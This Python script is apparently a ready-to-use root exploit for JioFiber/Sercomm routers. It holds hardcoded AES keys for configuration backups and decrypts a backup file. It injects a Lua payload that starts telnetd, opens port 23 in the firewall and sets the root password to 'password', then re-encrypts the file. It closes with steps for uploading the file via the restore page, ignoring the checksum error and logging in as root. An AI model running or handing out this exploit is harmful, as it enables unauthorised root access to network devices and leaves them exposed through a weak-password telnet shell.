#!/usr/bin/env python3
"""
JioFiber Universal Root Unlocker & Config Exploit Injector
Supports: Sercomm JCOW414, JCO4032, JCOW404, JCOW403, JCO110
"""
import sys, os, glob, subprocess

DEVICE_DATABASE = [
    {"name": "Sercomm JCOW414",  "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"},
    {"name": "JioFiber JCO4032", "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"},
    {"name": "JioFiber JCOW404", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCOW403", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCOW401", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCO110",  "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"}
]

UNIVERSAL_PAYLOAD = 'config.userdb = {} os.execute("telnetd -p 23; /usr/sbin/telnetd; /pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT 2>/dev/null; iptables -I INPUT -p tcp --dport 23 -j ACCEPT 2>/dev/null; echo -e \\"password\\npassword\\" | passwd root");'

def find_backup_file():
    if len(sys.argv) > 1:
        return sys.argv[1].strip('"\'')
    candidates = glob.glob("*JCO*.enc") + glob.glob("*.enc")
    candidates = [c for c in candidates if "root_ready" not in c]
    if candidates:
        return candidates[0]
    user_input = input("Drag & drop or enter path to downloaded backup (.enc) file: ").strip()
    return user_input.strip('"\'')

def try_decrypt(infile, key):
    dec_cmd = [
        "openssl", "aes-128-cbc", "-d",
        "-pass", f"pass:{key}",
        "-in", infile,
        "-out", "temp_dec.txt"
    ]
    try:
        subprocess.run(dec_cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        with open("temp_dec.txt", "r", encoding="latin-1") as f:
            first_line = f.readline()
        if "config" in first_line or "<?xml" in first_line:
            return True
    except Exception:
        pass
    if os.path.exists("temp_dec.txt"):
        os.remove("temp_dec.txt")
    return False

def main():
    print("=" * 65)
    print("     JioFiber JCOW414 Universal Root Unlocker")
    print("=" * 65)
    selected = DEVICE_DATABASE[0] # JCOW414
    infile = find_backup_file()
    if not os.path.exists(infile):
        print(f"[-] Error: File '{infile}' not found!")
        sys.exit(1)

    print(f"[*] Input file: {infile}")
    print("[1/3] Decrypting backup file...")
    success = try_decrypt(infile, selected['key'])
    used_key = selected['key']

    if not success:
        print("[!] Trying alternate JioFiber AES keys...")
        all_keys = [
            "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55",
            "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A"
        ]
        for k in all_keys:
            if k != selected['key'] and try_decrypt(infile, k):
                success = True
                used_key = k
                print("[✔] Successfully decrypted with alternate key!")
                break

    if not success:
        print("[-] Error: Decryption failed. Please ensure the router was downgraded to R2.15 first.")
        sys.exit(1)

    print("[2/3] Injecting root Telnet shell payload...")
    with open("temp_dec.txt", "r", encoding="latin-1") as f:
        lines = f.readlines()

    lines[0] = UNIVERSAL_PAYLOAD + "\n"
    with open("temp_dec.txt", "w", encoding="latin-1") as f:
        f.writelines(lines)

    print("[3/3] Re-encrypting into backup_root_ready.enc...")
    out_file = os.path.join(os.path.dirname(infile) or ".", "backup_root_ready.enc")
    enc_cmd = [
        "openssl", "aes-128-cbc",
        "-pass", f"pass:{used_key}",
        "-in", "temp_dec.txt",
        "-out", out_file
    ]
    try:
        subprocess.run(enc_cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if os.path.exists("temp_dec.txt"):
            os.remove("temp_dec.txt")
    except Exception as e:
        print(f"[-] Error during OpenSSL encryption: {e}")
        sys.exit(1)

    print("\n" + "=" * 65)
    print("SUCCESS! Exploit injected into: backup_root_ready.enc")
    print("=" * 65)
    print("Next steps:")
    print("1. Upload 'backup_root_ready.enc' via Router Web UI (Maintenance -> Restore)")
    print("2. (Ignore 'checksum error' - exploit runs before checksum check)")
    print("3. Telnet into 192.168.29.1 port 23 (user: root, pass: password)")

if __name__ == "__main__":
    main()
